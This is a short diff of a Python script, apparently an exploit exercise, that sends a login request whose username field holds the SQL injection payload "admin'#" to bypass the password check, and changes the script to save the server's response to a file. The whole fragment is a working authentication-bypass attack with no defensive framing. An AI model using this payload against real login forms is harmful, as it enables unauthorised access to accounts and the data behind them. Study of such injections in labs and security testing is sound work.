@@ -6,5 +6,6 @@ param = {"inputName":"admin'#", "inputPassword":"not_needed"}
 
 result = requests.post(targetUrl, param)
 
-print(result.url)
-print(result.text)
+f = open("out_1.txt", "w")
+
+f.write(result.text)
